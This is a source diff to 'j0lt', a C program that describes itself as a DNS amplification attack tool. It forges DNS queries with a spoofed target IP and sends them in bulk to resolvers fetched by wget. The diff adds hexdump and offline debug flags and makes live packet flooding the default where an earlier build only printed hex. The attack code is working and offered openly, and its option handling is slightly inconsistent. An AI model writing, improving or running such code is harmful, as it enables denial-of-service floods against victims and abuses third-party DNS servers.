@@ -56,8 +56,8 @@ const char* g_ansi = {
     "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-t <target>        : target IPv4 (spoof) \n"
     "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>          : target port         \n"
     "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -m <magnitude>     : magnitude of attack \n"
-    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░                                          \n"
-    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░                                          \n"
+    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░ -x [hexdump]       : print hexdump       \n"
+    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░ -d [debug]         : offline debug mode  \n"
     "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░                                          \n"
     "░░░░░      ░░░░░░░░░░░░░░░░░░░░░░  w3lc0m3 t0 j0lt                         \n"
     "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░░  a DNS amplification attack tool         \n"
@@ -205,6 +205,7 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     PEWPEW_J0LT 100 // value for the tmc effect. 
 #define     MAX_LINE_SZ_J0LT 0x30
 
+char** environ;
 const char* g_path = "/tmp/resolv.txt";
 char* g_wget[ ] = {
     "/bin/wget", "-O", "/tmp/resolv.txt",
@@ -231,14 +232,12 @@ CheckSum(const uint16_t* addr, size_t count);
 void
 PrintHex(void* data, size_t len);
 
-char** environ;
-#define DEBUG 1
 int
 main(int argc, char** argv)
 {
     FILE* fptr;
     char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ];
-    int status, i, opt, s;
+    int status, i, opt, s, debugmode, hexmode;
     size_t szpayload, nread, szpewpew;
     uint32_t spoofip, resolvip;
     uint16_t spoofport, magnitude;
@@ -255,8 +254,9 @@ main(int argc, char** argv)
     printf("%s", g_ansi);
     printf("argc: %d\n", argc);
 
+    debugmode = hexmode = 0;
     magnitude = spoofport = spoofip = -1;
-    opt = getopt(argc, argv, "t:p:m:");
+    opt = getopt(argc, argv, "t:p:m:hd");
     do {
         switch (opt) {
         case 't':
@@ -278,11 +278,18 @@ main(int argc, char** argv)
             if (errno != 0)
                 err_exit("* magnituted invalid");
             break;
+        case 'h':
+            hexmode = 1;
+            break;
+        case 'd':
+            debugmode = 1;
+            break;
         case -1:
         default: /* '?' */
             err_exit("Usage: ./j0lt <-t target> <-p port> <-m magnitude>\n");
         }
     } while ((opt = getopt(argc, argv, "t:p:m:")) != -1);
+
     if (magnitude == -1 || spoofport == -1 || spoofip == -1)
         err_exit("Usage: ./j0lt <-t target> <-p port> <-m magnitude>\n");
 
@@ -348,13 +355,13 @@ main(int argc, char** argv)
             if (resolvip == 0)
                 continue;
             szpayload = ForgeJ0ltPacket(payload, htonl(resolvip), htonl(spoofip), spoofport);
-#if !DEBUG  
-            szpewpew = PEWPEW_J0LT;
-            while (szpewpew-- > 0)
-                SendPayload(payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
-#else 
-            PrintHex(payload, szpayload);
-#endif
+            if (debugmode == 0) {
+                szpewpew = PEWPEW_J0LT;
+                while (szpewpew-- > 0)
+                    SendPayload(payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
+            }
+            if (hexmode == 1)
+                PrintHex(payload, szpayload);
         }
         magnitude--;
         rewind(fptr);
